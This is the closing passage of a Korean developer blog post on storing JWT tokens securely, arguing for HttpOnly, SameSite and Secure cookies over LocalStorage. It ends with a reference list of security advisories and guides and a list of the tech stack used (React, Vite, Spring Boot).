XSS 방어와 HttpOnly는 둘 다 필요합니다.

---

## 마치며

처음엔 "그냥 LocalStorage 쓰면 되지 않아?"라고 생각했습니다. 찾아보니 다 이유가 있었습니다. 2012년엔 LocalStorage가 정답이었지만, XSS 공격과 npm 공급망 공격이 현실이 된 지금은 토큰을 JavaScript에서 격리하는 게 핵심입니다.

결국 웹 보안의 원칙은 격리입니다. HttpOnly로 JavaScript와 격리하고, SameSite로 크로스 사이트 요청을 격리하고, Secure로 HTTP 전송을 격리합니다. 웹은 HttpOnly Cookie, 모바일은 Secure Storage, 서버 간 통신은 환경 변수를 씁니다. 각 환경의 특성에 맞게 토큰을 격리하는 게 중요합니다.

---

## 참고 자료

### 보안 사고 사례
- [CISA - Malware Discovered in Popular NPM Package, ua-parser-js](https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js)
- [Rapid7 - NPM Library (ua-parser-js) Hijacked](https://www.rapid7.com/blog/post/2021/10/25/npm-library-ua-parser-js-hijacked-what-you-need-to-know/)
- [The Hacker News - 25 Malicious npm Packages](https://thehackernews.com/2022/02/25-malicious-javascript-libraries.html)
- [Rapid7 - Cloudflare Cloudbleed Vulnerability](https://www.rapid7.com/blog/post/2017/02/24/cloudflare-data-leakage-or-dare-i-saycloudbleed/)
- [인기있는 NPM 라이브러리 하이잭 사고](https://blog.alyac.co.kr/4213)
- [디스코드 서버 하이재킹하는 악성 패키지](https://m.boannews.com/html/detail.html?idx=103228)
- [colors.js와 faker.js 사태가 준 교훈](https://yceffort.kr/2022/01/npm-colors-fakerjs)

### JWT 보안 가이드
- [OWASP - Token Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Auth0 - Token Storage Best Practices](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)
- [OWASP - XSS (Cross Site Scripting)](https://owasp.org/www-community/attacks/xss/)
- [GDSC UOS - JWT HTTPS Cookie 사용한 보안 로그인](https://gdsc-university-of-seoul.github.io/Login-by-JWT-HTTPS-COOKIE/)
- [velog - JWT의 안전한 저장소](https://velog.io/@kmlee95/JWT의-안전한-저장소)
- [velog - 프론트에서 안전하게 로그인 처리하기](https://velog.io/@yaytomato/프론트에서-안전하게-로그인-처리하기)

### SameSite 쿠키 정책
- [web.dev - SameSite cookies explained](https://web.dev/i18n/ko/samesite-cookies-explained/)
- [Google Developers - Get Ready for New SameSite=None; Secure Cookie Settings](https://developers.google.com/search/blog/2020/01/get-ready-for-new-samesitenone-secure)
- [HAHWUL - Cookie and SameSite](https://www.hahwul.com/2020/01/18/samesite-lax/)
- [Microsoft Learn - SameSite 쿠키 변경 처리](https://learn.microsoft.com/ko-kr/azure/active-directory/develop/howto-handle-samesite-cookie-changes-chrome-browser)
- [MDN - SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

### Vite 프록시 설정
- [Vite - Server Proxy 공식 문서](https://vitejs.dev/config/server-options.html#server-proxy)
- [velog - Vite 프록시 설정하는 법](https://velog.io/@zerone/Vite-Proxy-%EC%84%A4%EC%A0%95%ED%95%98%EB%8A%94-%EB%B2%95)
- [velog - Cookie SameSite 설정하기](https://velog.io/@seowj0710/Cookie-SameSite-%EC%84%A4%EC%A0%95%ED%95%98%EA%B8%B0)

### XSS 공격
- [SK쉴더스 - XSS 공격 유형부터 보안대책까지](https://www.skshieldus.com/blog-security/security-trend-idx-06)
- [민트민 개발 블로그 - XSS 직접 사용해 보기](https://www.mintmin.dev/blog/2401/20240119)
- [민동준 Medium - XSS 공격을 직접 해보면서 알아보기](https://dj-min43.medium.com/xss-공격을-직접-해보면서-알아보기-c2c1d9baf7ec)
- [falsy.me - XSS, CSRF에 대하여](https://falsy.me/웹-취약점-공격-방법인-xss-csrf에-대하여-간단하게-알아보/)

---

## 환경

- React 18
- Vite 5
- Axios 1.x
- Spring Boot 3.x
- Java 17
